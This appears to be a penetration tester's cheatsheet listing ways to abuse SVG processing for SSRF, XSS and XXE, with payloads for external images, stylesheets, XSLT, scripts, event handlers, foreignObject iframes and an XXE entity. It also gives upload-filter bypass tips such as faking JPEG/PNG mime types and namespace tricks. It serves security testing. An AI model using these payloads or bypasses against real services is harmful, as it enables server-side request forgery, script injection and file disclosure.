---
layout: memory
title: SVG SSRF Cheatsheet
---

Hosts that process SVG can potentially be vulnerable to SSRF, LFI, XSS, RCE because of the rich feature set of SVG.

All of these methods specify a URI, which can be absolute or relative. File and HTTP protocol are important to test, but it could also support other protocols depending on the implementation (e.g. PHP stream schemes), including javascript: and data:.

This document contains a list of all the ways I know about to abuse this functionality in SVG.

Note that some services that claim to not accept SVG as an input format actually do with a little coaxing.

* For uploads, send a JPEG/PNG mime type and filename.
* For downloads, have a JPEG/PNG filename and mime type. If refused, check for TOCTOU on the URL (double fetch) and if it follows redirects.
* I haven't seen it but Mime sniffing confusion is probably also possibleMime sniffing confusion as SVG is difficult to sniff because it can start with extra XML garbage. In fact, AFAICT the standard `file` command doesn't include any SVG magic, so it's likely up to the individual implementations.

# Images
SVG can include external images directly via the `<image>` tag.

``` xml
<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://example.com/image.jpg" height="200" width="200"/>
</svg>
```

Note that you can use this to include *other SVG* images too.

# The `<use>` tag

SVG can include external SVG content via the `<use>` tag.

file1.svg:
``` xml
<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="https://example.com/file2.svg#foo"/>
</svg>
```

file2.svg:
```
<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>
```

# CSS

## CSS Stylesheet `<link>`

SVG can include external stylesheets via the `<link>` tag, just like html.

``` xml
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
	<link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="http://example.com/style.css" type="text/css"/>
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>
```

## CSS stylesheet via `@include`

``` xml
<svg xmlns="http://www.w3.org/2000/svg">
  <style>
    @import url(http://example.com/style.css);
  </style>
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>
```

## CSS Stylesheet via `<?xml-stylesheet?>`

``` xml
<?xml-stylesheet href="http://example.com/style.css"?>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>
```

# XSLT

SVGs can include XSLT stylesheets via `<?xml-stylesheet?>`. Surprisingly, this does seem to work in chrome.

``` xml
<?xml version="1.0" ?>
<?xml-stylesheet href="https://example.com/style.xsl" type="text/xsl" ?>
<svg width="10cm" height="5cm"
     xmlns="http://www.w3.org/2000/svg">
  <rect x="2cm" y="1cm" width="6cm" height="3cm"/>
</svg>
```

``` xml
<?xml version="1.0"?>

<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns="http://www.w3.org/2000/svg"
        xmlns:svg="http://www.w3.org/2000/svg">
  <xsl:output
      method="xml"
      indent="yes"
      standalone="no"
      doctype-public="-//W3C//DTD SVG 1.1//EN"
      doctype-system="http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"
      media-type="image/svg" />

  <xsl:template match="/svg:svg">
    <svg width="10cm" height="5cm"
       xmlns="http://www.w3.org/2000/svg">
    <rect x="2cm" y="1cm" width="6cm" height="3cm" fill="red"/>
  </svg>
  </xsl:template>
</xsl:stylesheet>
```

Note: due to the nature of XSLT, the input doesn't actually *have* to be a valid SVG file if the xml-stylesheet is ignored, but it's useful to bypass filters. 

Also, Because I have no interest in learning XSLT, this template just wholesale replaces the entire "old" image with the new one.

# Javascript

## Inline

SVG can natively include inline javascript, just like HTML.

``` xml
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      document.getElementById("foo").setAttribute("fill", "blue");
   // ]]>
  </script>
</svg>
```

## External

SVG can also include external scripts.

``` xml
<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo" o="foo"/>
  <script src="http://example.com/script.js" type="text/javascript"/>
</svg>

```

## Inline in event

SVG can also have inline event handlers that get executed onload.

``` xml
<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo" o="foo"/>
  <image xlink:href="https://example.com/foo.jpg" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
</svg>
```

You can also bind handlers to animations and some other events. Read the SVG spec.

# XXE

Because SVG is XML, it can also have XXEs:

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!-- an internal subset can be embedded here -->
  <!ENTITY xxe SYSTEM "https://example.com/foo.txt">
]>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35">My &xxe;</text>
</svg>
```

# `<foreignObject>`

The `<foreignObject>` tag is insane. It can be used to include arbitrary (X)HTML in an SVG.

For example, to include an iframe:

``` xml
<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="http://example.com/"/>
  </foreignObject>
</svg>
```

If you don't have network access (e.g. sandbox) you can put a data URI or a javascript uri as the target of the iframe:

``` xml
<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
k   <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
  </foreignObject>
</svg>
```

If you haven't had enough SVGs, you can also include more SVGs via the `<object>` or `<embed>` tags. I think probably it's theoretically possible to put Flash in there too.

Note that also because you're in a different XML namespace, anything that stripped only `svg:script` might not have stripped `html:script` (or similar for attributes).

# Other

It's possible to include external fonts if you ever wanted to do that, I think both via CSS and via native attributes. This isn't really useful though because webfonts require CORS for some reason I don't really understand related to DRM for font resources to prevent hotlinking. I guess sometimes there are font engine vulnerabilities though.

## Text

This example from the SVG spec shows using a tref node to reference text by URI, however it doesn't seem to work in any viewer I've tried. If there is an implementation that supports it, it might also support external URIs for the href in the tref.

``` xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="10cm" height="3cm" viewBox="0 0 1000 300"
     xmlns="http://www.w3.org/2000/svg" version="1.1"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <text id="ReferencedText">
      Referenced character data
    </text>
  </defs>
  <desc>Example tref01 - inline vs reference text content</desc>
  <text x="100" y="100" font-size="45" fill="blue" >
    Inline character data
  </text>
  <text x="100" y="200" font-size="45" fill="red" >
    <tref xlink:href="#ReferencedText"/>
  </text>
  <!-- Show outline of canvas using 'rect' element -->
  <rect x="1" y="1" width="998" height="298"
        fill="none" stroke="blue" stroke-width="2" />
</svg>
```

